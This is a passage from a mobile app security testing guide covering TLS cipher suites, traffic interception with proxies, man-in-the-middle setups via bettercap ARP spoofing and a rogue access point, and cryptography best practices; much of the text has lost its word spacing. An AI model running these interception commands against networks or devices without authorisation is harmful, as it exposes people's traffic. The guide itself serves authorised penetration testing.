TLSv1.2andTLSv1.3areconsideredbestpracticeforsecuretransmissionofdata. StartingwithAndroid10(API level 29) TLS v1.3 will be enabled by default for faster and secure communication. The major change with TLS v1.3 is thatcustomizingciphersuitesisnolongerpossibleandthatallofthemareenabledwhenTLSv1.3isenabled,whereas ZeroRoundTrip(0-RTT)modeisn’tsupported. When both the client and server are controlled by the same organization and used only for communicating with one another,youcanincreasesecuritybyhardeningtheconfiguration. If a mobile application connects to a specific server, its networking stack can be tuned to ensure the highest possible security level for the server’s configuration. Lack of support in the underlying operating system may force the mobile applicationtouseaweakerconfiguration. Cipher Suites Terminology Ciphersuiteshavethefollowingstructure: Protocol_KeyExchangeAlgorithm_WITH_BlockCipher_IntegrityCheckAlgorithm Thisstructureincludes: 61\n• AProtocolusedbythecipher • AKeyExchangeAlgorithmusedbytheserverandtheclienttoauthenticateduringtheTLShandshake • ABlockCipherusedtoencryptthemessagestream • AIntegrityCheckAlgorithmusedtoauthenticatemessages Example: TLS_RSA_WITH_3DES_EDE_CBC_SHA Intheexampleabovetheciphersuitesuses: • TLSasprotocol • RSAAsymmetricencryptionforAuthentication • 3DESforSymmetricencryptionwithEDE_CBCmode • SHAHashalgorithmforintegrity NotethatinTLSv1.3theKeyExchangeAlgorithmisnotpartoftheciphersuite,insteaditisdeterminedduringtheTLS handshake. Inthefollowinglisting,we’llpresentthedifferentalgorithmsofeachpartoftheciphersuite. Protocols: • SSLv1 • SSLv2-RFC6176 • SSLv3-RFC6101 • TLSv1.0-RFC2246 • TLSv1.1-RFC4346 • TLSv1.2-RFC5246 • TLSv1.3-RFC8446 KeyExchangeAlgorithms: • DSA-RFC6979 • ECDSA-RFC6979 • RSA-RFC8017 • DHE-RFC2631-RFC7919 • ECDHE-RFC4492 • PSK-RFC4279 • DSS-FIPS186-4 • DH_anon-RFC2631-RFC7919 • DHE_RSA-RFC2631-RFC7919 • DHE_DSS-RFC2631-RFC7919 • ECDHE_ECDSA-RFC8422 • ECDHE_PSK-RFC8422-RFC5489 • ECDHE_RSA-RFC8422 BlockCiphers: • DES-RFC4772 • DES_CBC-RFC1829 • 3DES-RFC2420 • 3DES_EDE_CBC-RFC2420 • AES_128_CBC-RFC3268 • AES_128_GCM-RFC5288 • AES_256_CBC-RFC3268 • AES_256_GCM-RFC5288 • RC4_40-RFC7465 • RC4_128-RFC7465 • CHACHA20_POLY1305-RFC7905-RFC7539 IntegrityCheckAlgorithms: • MD5-RFC6151 • SHA-RFC6234 • SHA256-RFC6234 62\n• SHA384-RFC6234 Notethattheefficiencyofaciphersuitedependsontheefficiencyofitsalgorithms. ThefollowingresourcescontainthelatestrecommendedciphersuitestousewithTLS: • IANArecommendedciphersuitescanbefoundinTLSCipherSuites. • OWASPrecommendedciphersuitescanbefoundintheTLSCipherStringCheatSheet. SomeAndroidandiOSversionsdonotsupportsomeoftherecommendedciphersuites,soforcompatibilitypurposesyou cancheckthesupportedciphersuitesforAndroidandiOSversionsandchoosethetopsupportedciphersuites. Ifyouwanttoverifywhetheryourserversupportstherightciphersuites,therearevarioustoolsyoucanuse: • nscurl-seeiOSNetworkCommunicationformoredetails. • testssl.shwhich“isafreecommandlinetoolwhichchecksaserver’sserviceonanyportforthesupportofTLS/SSL ciphers,protocolsaswellassomecryptographicflaws”. Finally,verifythattheserverorterminationproxyatwhichtheHTTPSconnectionterminatesisconfiguredaccordingto best practices. See also the OWASP Transport Layer Protection cheat sheet and the Qualys SSL/TLS Deployment Best Practices. Intercepting HTTP(S) Traffic Inmanycases,itismostpracticaltoconfigureasystemproxyonthemobiledevice,sothatHTTP(S)trafficisredirected throughaninterceptionproxyrunningonyourhostcomputer. Bymonitoringtherequestsbetweenthemobileappclient and the backend, you can easily map the available server-side APIs and gain insight into the communication protocol. Additionally,youcanreplayandmanipulaterequeststotestforserver-sidevulnerabilities. Severalfreeandcommercialproxytoolsareavailable. Herearesomeofthemostpopular: • BurpSuite • OWASPZAP Tousetheinterceptionproxy,you’llneedtorunitonyourhostcomputerandconfigurethemobileapptorouteHTTP(S) requeststoyourproxy. Inmostcases,itisenoughtosetasystem-wideproxyinthenetworksettingsofthemobiledevice -iftheappusesstandardHTTPAPIsorpopularlibrariessuchasokhttp,itwillautomaticallyusethesystemsettings. UsingaproxybreaksSSLcertificateverificationandtheappwillusuallyfailtoinitiateTLSconnections. Toworkaround thisissue,youcaninstallyourproxy’sCAcertificateonthedevice. We’llexplainhowtodothisintheOS-specific“Basic SecurityTesting”chapters. 63\nIntercepting Non-HTTP Traffic InterceptionproxiessuchasBurpandOWASPZAPwon’tshownon-HTTPtraffic,becausetheyaren’tcapableofdecoding itproperlybydefault. Thereare,however,Burppluginsavailablesuchas: • Burp-non-HTTP-Extensionand • Mitm-relay. Thesepluginscanvisualizenon-HTTPprotocolsandyouwillalsobeabletointerceptandmanipulatethetraffic. NotethatthissetupcansometimesbecomeverytediousandisnotasstraightforwardastestingHTTP. Intercepting Traffic from the App Process Dependingonyourgoalwhiletestingtheapp,sometimesitisenoughtomonitorthetrafficbeforeitreachesthenetwork layerorwhentheresponsesarereceivedintheapp. Youdon’tneedtodeployafullyfledgedMITMattackifyousimplywanttoknowifacertainpieceofsensitivedataisbeing transmittedtothenetwork. Inthiscaseyouwouldn’tevenhavetobypasspinning,ifimplemented. Youjusthavetohook therightfunctions,e.g.SSL_writeandSSL_readfromopenssl. This would work pretty well for apps using standard API libraries functions and classes, however there might be some downsides: • theappmightimplementacustomnetworkstackandyou’llhavetospendtimeanalyzingtheapptofindoutthe APIsthatyoucanuse. Seesection“SearchingforOpenSSLtraceswithsignatureanalysis”inthisblogpost. • itmightbeverytimeconsumingtocrafttherighthookingscriptstore-assembleHTTPresponsepairs(acrossmany methodcallsandexecutionthreads). Youmightfindready-madescriptsandevenforalternativenetworkstacks butdependingontheappandtheplatformthesescriptsmightneedalotofmaintenanceandmightnotalways work. Seesomeexamples: • “Universal interception. How to bypass SSL Pinning and monitor traffic of any application”, sections “Grabbing payloadpriortotransmission”and“Grabbingpayloadpriortoencryption” • “FridaasanAlternativetoNetworkTracing” ThistechniqueisalsousefulforothertypesoftrafficsuchasBLE,NFC,etc. wheredeployingaMITMattackmight beverycostlyandorcomplex. Intercepting Traffic on the Network Layer Dynamicanalysisbyusinganinterceptionproxycanbestraightforwardifstandardlibrariesareusedintheappandall communicationisdoneviaHTTP.Butthereareseveralcaseswherethisisnotworking: • IfmobileapplicationdevelopmentplatformslikeXamarinareusedthatignorethesystemproxysettings; • Ifmobileapplicationsverifyifthesystemproxyisusedandrefusetosendrequeststhroughaproxy; • Ifyouwanttointerceptpushnotifications,likeforexampleGCM/FCMonAndroid; • IfXMPPorothernon-HTTPprotocolsareused. Inthesecasesyouneedtomonitorandanalyzethenetworktrafficfirstinordertodecidewhattodonext. Luckily,there areseveraloptionsforredirectingandinterceptingnetworkcommunication: • Routethetrafficthroughthehostcomputer. Youcansetuphostcomputerasthenetworkgateway,e.g.byusing thebuilt-inInternetSharingfacilitiesofyouroperatingsystem. YoucanthenuseWiresharktosniffanytrafficfrom themobiledevice. • Sometimes you need to execute a MITM attack to force the mobile device to talk to you. For this scenario you shouldconsiderbettercaporuseyourownaccesspointtoredirectnetworktrafficfromthemobiledevicetoyour hostcomputer(seebelow). 64\n• Onarooteddevice,youcanusehookingorcodeinjectiontointerceptnetwork-relatedAPIcalls(e.g.HTTPrequests) anddumporevenmanipulatetheargumentsofthesecalls. Thiseliminatestheneedtoinspecttheactualnetwork data. We’lltalkinmoredetailaboutthesetechniquesinthe“ReverseEngineeringandTampering”chapters. • OnmacOS,youcancreatea“RemoteVirtualInterface”forsniffingalltrafficonaniOSdevice. We’lldescribethis methodinthechapter“BasicSecurityTestingoniOS”. Simulating a Man-in-the-Middle Attack with bettercap Network Setup Tobeabletogetaman-in-the-middlepositionyourhostcomputershouldbeinthesamewirelessnetworkasthemobile phoneandthegatewayitcommunicatesto. OncethisisdoneyouneedtheIPaddressofyourmobilephone. Forafull dynamicanalysisofamobileapp,allnetworktrafficshouldbeintercepted. MITM Attack Start your preferred network analyzer tool first, then start bettercap with the following command and replace the IP addressbelow(X.X.X.X)withthetargetyouwanttoexecutetheMITMattackagainst. $sudobettercap -eval "setarp.spoof.targetsX.X.X.X;arp.spoofon;setarp.spoof.internaltrue;setarp.spoof.fullduplextrue;" bettercapv2.22 (builtfordarwinamd64withgo1.12.1)[type 'help' foralistofcommands] [19:21:39] [sys.log][inf]arp.spoofenablingforwarding [19:21:39] [sys.log][inf]arp.spoofarpspooferstarted,probing1targets. bettercapwillthenautomaticallysendthepacketstothenetworkgatewayinthe(wireless)networkandyouareableto sniffthetraffic. Beginningof2019supportforfullduplexARPspoofingwasaddedtobettercap. On the mobile phone start the browser and navigate tohttp://example.com, you should see output like the following whenyouareusingWireshark. Ifthat’sthecase,youarenowabletoseethecompletenetworktrafficthatissentandreceivedbythemobilephone. This includesalsoDNS,DHCPandanyotherformofcommunicationandcanthereforebequite“noisy”. Youshouldtherefore knowhowtouseDisplayFiltersinWiresharkorknowhowtofilterintcpdumptofocusonlyontherelevanttrafficforyou. Man-in-the-middleattacksworkagainstanydeviceandoperatingsystemastheattackisexecutedonOSILayer2 throughARPSpoofing. WhenyouareMITMyoumightnotbeabletoseecleartextdata,asthedataintransitmight be encrypted by using TLS, but it will give you valuable information about the hosts involved, the protocols used andtheportstheappiscommunicatingwith. 65\nSimulating a Man-in-the-Middle Attack with an access point Network Setup A simple way to simulate a man-in-the-middle (MITM) attack is to configure a network where all packets between the devicesinscopeandthetargetnetworkaregoingthroughyourhostcomputer. Inamobilepenetrationtest,thiscanbe achievedbyusinganaccesspointthemobiledevicesandyourhostcomputerareconnectedto. Yourhostcomputeris thenbecomingarouterandanaccesspoint. Followingscenariosarepossible: • Use your host computer’s built-in WiFi card as an access point and use your wired connection to connect to the targetnetwork. • UseanexternalUSBWiFicardasanaccesspointanduseyourhostcomputer’sbuilt-inWiFitoconnecttothetarget network(canbevice-versa). • Useaseparateaccesspointandredirectthetraffictoyourhostcomputer. ThescenariowithanexternalUSBWiFicardrequirethatthecardhasthecapabilitytocreateanaccesspoint. Additionally, youneedtoinstallsometoolsand/orconfigurethenetworktoenforceaman-in-the-middleposition(seebelow). Youcan verifyifyourWiFicardhasAPcapabilitiesbyusingthecommandiwconfigonKaliLinux: iwlist |grep AP ThescenariowithaseparateaccesspointrequiresaccesstotheconfigurationoftheAPandyoushouldcheckfirstifthe APsupportseither: • portforwardingor • hasaspanormirrorport. InbothcasestheAPneedstobeconfiguredtopointtoyourhostcomputer’sIP.Yourhostcomputermustbeconnectedto theAP(viawiredconnectionorWiFi)andyouneedtohaveconnectiontothetargetnetwork(canbethesameconnection astotheAP).Someadditionalconfigurationmayberequiredonyourhostcomputertoroutetraffictothetargetnetwork. Iftheseparateaccesspointbelongstothecustomer,allchangesandconfigurationsshouldbeclarifiedpriortothe engagementandabackupshouldbecreated,beforemakinganychanges. Installation Thefollowingprocedureissettingupaman-in-the-middlepositionusinganaccesspointandanadditionalnetworkinter- face: CreateaWiFinetworkeitherthroughaseparateaccesspointorthroughanexternalUSBWiFicardorthroughthebuilt-in cardofyourhostcomputer. 66\nThiscanbedonebyusingthebuilt-inutilitiesonmacOS.YoucanusesharetheinternetconnectiononMacwithother networkusers. ForallmajorLinuxandUnixoperatingsystemsyouneedtoolssuchas: • hostapd • dnsmasq • iptables • wpa_supplicant • airmon-ng ForKaliLinuxyoucaninstallthesetoolswithapt-get: apt-getupdate apt-getinstallhostapddnsmasqaircrack-ng iptablesandwpa_supplicantareinstalledbydefaultonKaliLinux. Incaseofaseparateaccesspoint,routethetraffictoyourhostcomputer. IncaseofanexternalUSBWiFicardorbuilt-in WiFicardthetrafficisalreadyavailableonyourhostcomputer. RoutetheincomingtrafficcomingfromtheWiFitotheadditionalnetworkinterfacewherethetrafficcanreachthetarget network. AdditionalnetworkinterfacecanbewiredconnectionorotherWiFicard,dependingonyoursetup. Configuration WefocusontheconfigurationfilesforKaliLinux. Followingvaluesneedtobedefined: • wlan1-idoftheAPnetworkinterface(withAPcapabilities), • wlan0-idofthetargetnetworkinterface(thiscanbewiredinterfaceorotherWiFicard) • 10.0.0.0/24-IPaddressesandmaskofAPnetwork Thefollowingconfigurationfilesneedtobechangedandadjustedaccordingly: • hostapd.conf #Name oftheWiFiinterfaceweuse interface=wlan1 #Use thenl80211driver driver=nl80211 hw_mode=g channel=6 wmm_enabled=1 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_key_mgmt=WPA-PSK rsn_pairwise=CCMP #Name oftheAPnetwork ssid=STM-AP #Password oftheAPnetwork wpa_passphrase=password • wpa_supplicant.conf network={ ssid="NAME_OF_THE_TARGET_NETWORK" psk="PASSWORD_OF_THE_TARGET_NETWORK" } • dnsmasq.conf interface=wlan1 dhcp-range=10.0.0.10,10.0.0.250,12h dhcp-option=3,10.0.0.1 dhcp-option=6,10.0.0.1 server=8.8.8.8 log-queries log-dhcp listen-address=127.0.0.1 67\nMITM Attack Tobeabletogetaman-in-the-middlepositionyouneedtoruntheaboveconfiguration. Thiscanbedonebyusingthe followingcommandsonKaliLinux: #checkifotherprocessisnotusingWiFiinterfaces $airmon-ngcheckkill #configureIPaddressoftheAPnetworkinterface $ifconfigwlan110.0.0.1up #startaccesspoint $hostapdhostapd.conf #connectthetargetnetworkinterface $wpa_supplicant -B-iwlan0 -cwpa_supplicant.conf #runDNSserver $dnsmasq -Cdnsmasq.conf -d #enablerouting $echo1 >/proc/sys/net/ipv4/ip_forward #iptableswillNATconnectionsfromAPnetworkinterfacetothetargetnetworkinterface $iptables --flush $iptables --table nat--append POSTROUTING --out-interface wlan0 -jMASQUERADE $iptables --append FORWARD --in-interface wlan1 -jACCEPT $iptables -tnat-APOSTROUTING -jMASQUERADE Nowyoucanconnectyourmobiledevicestotheaccesspoint. Network Analyzer Tool Installatoolthatallowsyoutomonitorandanalyzethenetworktrafficthatwillberedirectedtoyourhostcomputer. The twomostcommonnetworkmonitoring(orcapturing)toolsare: • Wireshark(CLIpendant: TShark) • tcpdump Wireshark offers a GUI and is more straightforward if you are not used to the command line. If you are looking for a commandlinetoolyoushouldeitheruseTSharkortcpdump. AllofthesetoolsareavailableforallmajorLinuxandUnix operatingsystemsandshouldbepartoftheirrespectivepackageinstallationmechanisms. Setting a Proxy Through Runtime Instrumentation Onarootedorjailbrokendevice, youcanalsouseruntimehookingtosetanewproxyorredirectnetworktraffic. This canbeachievedwithhookingtoolslikeInspeckageorcodeinjectionframeworkslikeFridaandcycript. You’llfindmore informationaboutruntimeinstrumentationinthe“ReverseEngineeringandTampering”chaptersofthisguide. Example - Dealing with Xamarin Asanexample,wewillnowredirectallrequestsfromaXamarinapptoaninterceptionproxy. XamarinisamobileapplicationdevelopmentplatformthatiscapableofproducingnativeAndroidandiOSappsbyusing VisualStudioandC#asprogramminglanguage. WhentestingaXamarinappandwhenyouaretryingtosetthesystemproxyintheWi-Fisettingsyouwon’tbeableto seeanyHTTPrequestsinyourinterceptionproxy,astheappscreatedbyXamarindonotusethelocalproxysettingsof yourphone. Therearethreewaystoresolvethis: • 1stway: Addadefaultproxytotheapp,byaddingthefollowingcodeintheOnCreateorMainmethodandre-create theapp: WebRequest.DefaultWebProxy =newWebProxy("192.168.11.1",8080); • 2ndway: Usebettercapinordertogetaman-in-the-middleposition(MITM),seethesectionaboveabouthowto setupaMITMattack. WhenbeingMITMyouonlyneedtoredirectport443toyourinterceptionproxyrunningon localhost. ThiscanbedonebyusingthecommandrdronmacOS: 68\n$echo " rdrpass inetprototcpfromanytoanyport443->127.0.0.1port8080 "|sudo pfctl -ef- ForLinuxsystemsyoucanuseiptables: sudo iptables -tnat-APREROUTING -ptcp--dport 443-jDNAT --to-destination 127.0.0.1:8080 Aslaststep,youneedtosettheoption‘Supportinvisibleproxy’inthelistenersettingsofBurpSuite. • 3rdway: Insteadofbettercapanalternativeistweakingthe/etc/hostsonthemobilephone. Addanentryinto /etc/hostsforthetargetdomainandpointittotheIPaddressofyourinterceptingproxy. Thiscreatesasimilar situation of being MITM as with bettercap and you need to redirect port 443 to the port which is used by your interceptionproxy. The redirectioncan be applied as mentioned above. Additionally, you need to redirecttraffic fromyourinterceptionproxytotheoriginallocationandport. When redirecting traffic you should create narrow rules to the domains and IPs in scope, to minimize noise and out-of-scopetraffic. Theinterceptionproxyneedtolistentotheportspecifiedintheportforwardingruleabove,whichis8080. WhenaXamarinappisconfiguredtouseaproxy(e.g.byusingWebRequest.DefaultWebProxy)youneedtospecifywhere trafficshouldgonext,afterredirectingthetraffictoyourinterceptingproxy. Youneedtoredirectthetraffictotheoriginal location. ThefollowingprocedureissettinguparedirectioninBurptotheoriginallocation: 1. GotoProxytabandclickonOptions 2. Selectandedityourlistenerfromthelistofproxylisteners. 3. GotoRequesthandlingtabandset: • Redirecttohost: provideoriginaltrafficlocation. • Redirecttoport: provideoriginalportlocation. • Set‘ForceuseofSSL’(whenHTTPSisused)andset‘Supportinvisibleproxy’. 69\nCA Certificates Ifnotalreadydone,installtheCAcertificatesinyourmobiledevicewhichwillallowustointerceptHTTPSrequests: • InstalltheCAcertificateofyourinterceptionproxyintoyourAndroidphone>NotethatstartingwithAndroid7.0 (API level 24) the OS no longer trusts a user supplied CA certificate unless specified in the app. Bypassing this securitymeasurewillbeaddressedinthe“BasicSecurityTesting”chapters. • InstalltheCAcertificateofyourinterceptionproxyintoyouriOSphone Intercepting Traffic Startusingtheappandtriggeritsfunctions. YoushouldseeHTTPmessagesshowingupinyourinterceptionproxy. Whenusingbettercapyouneedtoactivate“Supportinvisibleproxying”inProxyTab/Options/EditInterface 70\nMobile App Cryptography Cryptographyplaysanespeciallyimportantroleinsecuringtheuser’sdata-evenmoresoinamobileenvironment,where attackershavingphysicalaccesstotheuser’sdeviceisalikelyscenario. Thischapterprovidesanoutlineofcryptographic conceptsandbestpracticesrelevanttomobileapps. Thesebestpracticesarevalidindependentofthemobileoperating system. Key Concepts The goal of cryptography is to provide constant confidentiality, data integrity, and authenticity, even in the face of an attack. Confidentiality involves ensuring data privacy through the use of encryption. Data integrity deals with data consistencyanddetectionoftamperingandmodificationofdatathroughtheuseofhashing. Authenticityensuresthat thedatacomesfromatrustedsource. Encryptionalgorithmsconvertsplaintextdataintociphertextthatconcealstheoriginalcontent. Plaintextdatacanbe restoredfromtheciphertextthroughdecryption. Encryptioncanbesymmetric(encryption/decryptionwithsamesecret- key)orasymmetric(encryption/decryptionusingapublicandprivatekeypair). Ingeneral,encryptionoperationsdonot protectintegrity,butsomesymmetricencryptionmodesalsofeaturethatprotection. Symmetric-keyencryptionalgorithmsusethesamekeyforbothencryptionanddecryption. Thistypeofencryption isfastandsuitableforbulkdataprocessing. Sinceeverybodywhohasaccesstothekeyisabletodecrypttheencrypted content,thismethodrequirescarefulkeymanagementandcentralizedcontroloverkeydistribution. Public-keyencryptionalgorithmsoperatewithtwoseparatekeys: thepublickeyandtheprivatekey. Thepublickey can be distributed freely while the private key shouldn’t be shared with anyone. A message encrypted with the public key can only be decrypted with the private key and vice-versa. Since asymmetric encryption is several times slower than symmetric operations, it’s typically only used to encrypt small amounts of data, such as symmetric keys for bulk encryption. Hashingisn’taformofencryption,butitdoesusecryptography. Hashfunctionsdeterministicallymaparbitrarypiecesof dataintofixed-lengthvalues. It’seasytocomputethehashfromtheinput,butverydifficult(i.e.infeasible)todetermine theoriginalinputfromthehash. Additionally,thehashwillcompletelychangewhenevenasinglebitoftheinputchanges. Hashfunctionsareusedforintegrityverification,butdon’tprovideanauthenticityguarantee. Message Authentication Codes(MACs)combineothercryptographicmechanisms(suchassymmetricencryptionor hashes)withsecretkeystoprovidebothintegrityandauthenticityprotection. However,inordertoverifyaMAC,multiple entitieshavetosharethesamesecretkeyandanyofthoseentitiescangenerateavalidMAC.HMACs,themostcommonly usedtypeofMAC,relyonhashingastheunderlyingcryptographicprimitive. ThefullnameofanHMACalgorithmusually includestheunderlyinghashfunction’stype(forexample,HMAC-SHA256usestheSHA-256hashfunction). Signaturescombineasymmetriccryptography(thatis,usingapublic/privatekeypair)withhashingtoprovideintegrity and authenticity by encrypting the hash of the message with the private key. However, unlike MACs, signatures also providenon-repudiationpropertyastheprivatekeyshouldremainuniquetothedatasigner. Key Derivation Functions (KDFs) derive secret keys from a secret value (such as a password) and are used to turn keys into other formats or to increase their length. KDFs are similar to hashing functions but have other uses as well (forexample,theyareusedascomponentsofmulti-partykey-agreementprotocols). Whilebothhashingfunctionsand KDFs must be difficult to reverse, KDFs have the added requirement that the keys they produce must have a level of randomness. Identifying Insecure and/or Deprecated Cryptographic Algorithms When assessing a mobile app, you should make sure that it does not use cryptographic algorithms and protocols that havesignificantknownweaknessesorareotherwiseinsufficientformodernsecurityrequirements. Algorithmsthatwere consideredsecureinthepastmaybecomeinsecureovertime;therefore,it’simportanttoperiodicallycheckcurrentbest practicesandadjustconfigurationsaccordingly. Verifythatcryptographicalgorithmsareuptodateandin-linewithindustrystandards. Vulnerablealgorithmsincludeout- datedblockciphers(suchasDESand3DES),streamciphers(suchasRC4),hashfunctions(suchasMD5andSHA1),and brokenrandomnumbergenerators(suchasDual_EC_DRBGandSHA1PRNG).Notethatevenalgorithmsthatarecertified 71\n(forexample, byNIST)canbecomeinsecureovertime. Acertificationdoesnotreplaceperiodicverificationofanalgo- rithm’ssoundness. Algorithmswithknownweaknessesshouldbereplacedwithmoresecurealternatives. Additionally, algorithms used for encryption must be standardized and open to verification. Encrypting data using any unknown, or proprietaryalgorithmsmayexposetheapplicationtodifferentcryptographicattackswhichmayresultinrecoveryofthe plaintext. Inspecttheapp’ssourcecodetoidentifyinstancesofcryptographicalgorithmsthatareknowntobeweak,suchas: • DES,3DES • RC2 • RC4 • BLOWFISH • MD4 • MD5 • SHA1 ThenamesofcryptographicAPIsdependontheparticularmobileplatform. Pleasemakesurethat: • Cryptographic algorithms are up to date and in-line with industry standards. This includes, but is not limited to outdated block ciphers (e.g. DES), stream ciphers (e.g. RC4), as well as hash functions (e.g. MD5) and broken randomnumbergeneratorslikeDual_EC_DRBG(eveniftheyareNISTcertified). Alloftheseshouldbemarkedas insecureandshouldnotbeusedandremovedfromtheapplicationandserver. • Keylengthsarein-linewithindustrystandardsandprovideprotectionforsufficientamountoftime. Acomparison ofdifferentkeylengthsandprotectiontheyprovidetakingintoaccountMoore’slawisavailableonline. • Cryptographicmeansarenotmixedwitheachother: e.g.youdonotsignwithapublickey,ortrytoreuseakey pairusedforasignaturetodoencryption. • Cryptographic parameters are well defined within reasonable range. This includes, but is not limited to: cryp- tographicsalt, whichshouldbeatleastthesamelengthashashfunctionoutput, reasonablechoiceofpassword derivationfunctionanditerationcount(e.g.PBKDF2,scryptorbcrypt),IVsbeingrandomandunique,fit-for-purpose blockencryptionmodes(e.g.ECBshouldnotbeused,exceptspecificcases),keymanagementbeingdoneproperly (e.g.3DESshouldhavethreeindependentkeys)andsoon. Thefollowingalgorithmsarerecommended: • Confidentialityalgorithms: AES-GCM-256orChaCha20-Poly1305 • Integrityalgorithms: SHA-256,SHA-384,SHA-512,BLAKE3,theSHA-3family • Digitalsignaturealgorithms: RSA(3072bitsandhigher),ECDSAwithNISTP-384 • Keyestablishmentalgorithms: RSA(3072bitsandhigher),DH(3072bitsorhigher),ECDHwithNISTP-384 Additionally,youshouldalwaysrelyonsecurehardware(ifavailable)forstoringencryptionkeys,performingcryptographic operations,etc. Formoreinformationonalgorithmchoiceandbestpractices,seethefollowingresources: • “CommercialNationalSecurityAlgorithmSuiteandQuantumComputingFAQ” • NISTrecommendations(2019) • BSIrecommendations(2019) Common Configuration Issues Insufficient Key Length Eventhemostsecureencryptionalgorithmbecomesvulnerabletobrute-forceattackswhenthatalgorithmusesaninsuf- ficientkeysize. Ensurethatthekeylengthfulfillsacceptedindustrystandards. 72\nSymmetric Encryption with Hard-Coded Cryptographic Keys Thesecurityofsymmetricencryptionandkeyedhashes(MACs)dependsonthesecrecyofthekey. Ifthekeyisdisclosed, the security gained by encryption is lost. To prevent this, never store secret keys in the same place as the encrypted datatheyhelpedcreate. Acommonmistakeisencryptinglocallystoreddatawithastatic,hardcodedencryptionkeyand compilingthatkeyintotheapp. Thismakesthekeyaccessibletoanyonewhocanuseadisassembler. Hardcodedencryptionkeymeansthatakeyis: • partofapplicationresources • valuewhichcanbederivedfromknownvalues • hardcodedincode First, ensure that no keys or passwords are stored within the source code. This means you should check native code, JavaScript/Dartcode,Java/KotlincodeonAndroidandObjective-C/SwiftiniOS.Notethathard-codedkeysareproblematic evenifthesourcecodeisobfuscatedsinceobfuscationiseasilybypassedbydynamicinstrumentation. Iftheappisusingtwo-wayTLS(bothserverandclientcertificatesarevalidated),makesurethat: • Thepasswordtotheclientcertificateisn’tstoredlocallyorislockedinthedeviceKeychain. • Theclientcertificateisn’tsharedamongallinstallations. Iftheappreliesonanadditionalencryptedcontainerstoredinappdata,checkhowtheencryptionkeyisused. Ifakey- wrappingschemeisused,ensurethatthemastersecretisinitializedforeachuserorthecontainerisre-encryptedwith newkey. Ifyoucanusethemastersecretorpreviouspasswordtodecryptthecontainer,checkhowpasswordchanges arehandled. Secretkeysmustbestoredinsecuredevicestoragewheneversymmetriccryptographyisusedinmobileapps. Formore informationontheplatform-specificAPIs,seethe“DataStorageonAndroid”and“DataStorageoniOS”chapters. Weak Key Generation Functions Cryptographicalgorithms(suchassymmetricencryptionorsomeMACs)expectasecretinputofagivensize. Forexample, AESusesakeyofexactly16bytes. Anativeimplementationmightusetheuser-suppliedpassworddirectlyasaninput key. Usingauser-suppliedpasswordasaninputkeyhasthefollowingproblems: • Ifthepasswordissmallerthanthekey,thefullkeyspaceisn’tused. Theremainingspaceispadded(spacesare sometimesusedforpadding). • Auser-suppliedpasswordwillrealisticallyconsistmostlyofdisplayableandpronounceablecharacters. Therefore, onlysomeofthepossible256ASCIIcharactersareusedandentropyisdecreasedbyapproximatelyafactoroffour. Ensurethatpasswordsaren’tdirectlypassedintoanencryptionfunction. Instead,theuser-suppliedpasswordshouldbe passedintoaKDFtocreateacryptographickey. Chooseanappropriateiterationcountwhenusingpasswordderivation functions. Forexample,NISTrecommendsaniterationcountofatleast10,000forPBKDF2andforcriticalkeyswhereuser- perceivedperformanceisnotcriticalatleast10,000,000. Forcriticalkeys,itisrecommendedtoconsiderimplementation ofalgorithmsrecognizedbyPasswordHashingCompetition(PHC)likeArgon2. Weak Random Number Generators It is fundamentally impossible to produce truly random numbers on any deterministic device. Pseudo-random number generators (RNG) compensate for this by producing a stream of pseudo-random numbers - a stream of numbers that appear as if they were randomly generated. The quality of the generated numbers varies with the type of algorithm used. CryptographicallysecureRNGsgeneraterandomnumbersthatpassstatisticalrandomnesstests,andareresilient againstpredictionattacks(e.g.itisstatisticallyinfeasibletopredictthenextnumberproduced). MobileSDKsofferstandardimplementationsofRNGalgorithmsthatproducenumberswithsufficientartificialrandomness. We’llintroducetheavailableAPIsintheAndroidandiOSspecificsections. 73\nCustom Implementations of Cryptography Inventing proprietary cryptographic functions is time consuming, difficult, and likely to fail. Instead, we can use well- knownalgorithmsthatarewidelyregardedassecure. MobileoperatingsystemsofferstandardcryptographicAPIsthat implementthosealgorithms. Carefullyinspectallthecryptographicmethodsusedwithinthesourcecode,especiallythosethataredirectlyappliedto sensitivedata. AllcryptographicoperationsshouldusestandardcryptographicAPIsforAndroidandiOS(we’llwriteabout thoseinmoredetailintheplatform-specificchapters). Anycryptographicoperationsthatdon’tinvokestandardroutines from known providers should be closely inspected. Pay close attention to standard algorithms that have been modi- fied. Rememberthatencodingisn’tthesameasencryption! Alwaysinvestigatefurtherwhenyoufindbitmanipulation operatorslikeXOR(exclusiveOR). Atallimplementationsofcryptography,youneedtoensurethatthefollowingalwaystakesplace: • Worker keys (like intermediary/derived keys in AES/DES/Rijndael) are properly removed from memory after con- sumptionorincaseoferror. • Theinnerstateofaciphershouldberemovedfrommemoryassoonaspossible. Inadequate AES Configuration Advanced Encryption Standard (AES) is the widely accepted standard for symmetric encryption in mobile apps. It’s an iterative block cipher that is based on a series of linked mathematical operations. AES performs a variable number of roundsontheinput,eachofwhichinvolvesubstitutionandpermutationofthebytesintheinputblock. Eachrounduses a128-bitroundkeywhichisderivedfromtheoriginalAESkey. Asofthiswriting,noefficientcryptanalyticattacksagainstAEShavebeendiscovered. However,implementationdetails andconfigurableparameterssuchastheblockciphermodeleavesomemarginforerror. Weak Block Cipher Mode Block-basedencryptionisperformedupondiscreteinputblocks(forexample,AEShas128-bitblocks). Iftheplaintextis largerthantheblocksize,theplaintextisinternallysplitupintoblocksofthegiveninputsizeandencryptionisperformed oneachblock. Ablockciphermodeofoperation(orblockmode)determinesiftheresultofencryptingthepreviousblock impactssubsequentblocks. ECB(ElectronicCodebook)dividestheinputintofixed-sizeblocksthatareencryptedseparatelyusingthesamekey. If multipledividedblockscontainthesameplaintext, theywillbeencryptedintoidenticalciphertextblockswhichmakes patternsindataeasiertoidentify. Insomesituations,anattackermightalsobeabletoreplaytheencrypteddata. VerifythatCipherBlockChaining(CBC)modeisusedinsteadofECB.InCBCmode,plaintextblocksareXORedwiththe previousciphertextblock. Thisensuresthateachencryptedblockisuniqueandrandomizedevenifblockscontainthe sameinformation. PleasenotethatitisbesttocombineCBCwithanHMACand/orensurethatnoerrorsaregivensuch as“Paddingerror”,“MACerror”,“decryptionfailed”inordertobemoreresistanttoapaddingoracleattack. 74\nWhenstoringencrypteddata,werecommendusingablockmodethatalsoprotectstheintegrityofthestoreddata,such as Galois/Counter Mode (GCM). The latter has the additional benefit that the algorithm is mandatory for each TLSv1.2 implementation,andthusisavailableonallmodernplatforms. 